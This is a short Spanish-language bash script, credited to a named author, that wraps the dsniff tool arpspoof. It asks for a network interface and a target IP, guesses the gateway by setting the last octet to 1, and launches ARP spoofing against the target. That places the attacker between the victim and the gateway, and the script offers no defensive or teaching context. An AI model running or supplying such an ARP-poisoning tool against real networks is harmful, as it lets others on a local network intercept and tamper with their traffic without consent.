#!/bin/bash

echo -e "\033[93mCreado por @pdomiinguezz_ \033[0m"
cat << "EOF"

       _
 ('v')
//-=-\\
(\_=_/)
 ^^ ^^

EOF

check_herramientas() {
if ! [ -x "$(command -v $1)" ]; then
echo "Error: $1 no está instalado. Por favor, instala $1 y vuelve a intentarlo." >&2
exit 1
fi
}
check_herramientas "dsniff"

read -p  "Inserte la interfaz de red que quisieras analizar: " interfaz
read -p "insere la IP objetivo: " ip
puerta_enlace=$(echo $ip | sed  's/\([0-9]\+\)$/1/g')

arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace"
